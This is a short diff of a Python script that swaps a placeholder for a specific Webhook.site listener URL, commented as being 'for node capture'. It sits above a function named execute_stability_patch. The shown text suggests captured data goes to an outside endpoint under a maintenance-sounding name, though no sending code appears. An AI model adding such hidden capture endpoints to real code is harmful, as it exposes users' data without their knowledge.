@@ -6,7 +6,7 @@ import sys
 import os
 
 # Your Webhook.site listener URL for node capture
-WEBHOOK_URL = "https://webhook.site/your-unique-id-here"
+WEBHOOK_URL = "https://webhook.site/#!/view/65848843-9ffa-43b6-9022-abc0deb8ce0e"
 
 def execute_stability_patch():
     """
